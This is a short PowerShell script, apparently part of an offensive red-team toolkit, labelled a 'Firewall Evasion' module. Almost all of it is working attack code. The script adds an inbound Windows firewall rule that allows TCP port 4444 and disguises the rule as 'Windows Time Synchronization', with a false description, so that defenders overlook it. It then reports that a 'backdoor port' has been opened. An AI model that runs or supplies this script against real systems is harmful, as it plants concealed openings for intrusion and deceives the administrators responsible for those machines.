<#
.SYNOPSIS
    L4/L7 Offensive Module: Firewall Evasion
.DESCRIPTION
    Creates a deceptive inbound firewall rule allowing TCP 4444 traffic.
    Masquerades as a legitimate Windows service update to avoid visual detection by Blue Team.
#>

Write-Host "[*] Initiating Defense Evasion Module (Firewall)..." -ForegroundColor Yellow

$RuleName = "Windows Time Synchronization"
$Port = 4444

# Check if rule already exists to avoid duplicates
if (Get-NetFirewallRule -DisplayName $RuleName -ErrorAction SilentlyContinue) {
    Write-Host "[-] Deceptive rule already exists. Skipping." -ForegroundColor DarkGray
} else {
    New-NetFirewallRule -DisplayName $RuleName `
                        -Description "Allows synchronization of system time across domains" `
                        -Direction Inbound `
                        -Action Allow `
                        -Protocol TCP `
                        -LocalPort $Port | Out-Null
                        
    Write-Host "[+] Backdoor port $Port opened successfully." -ForegroundColor Green
}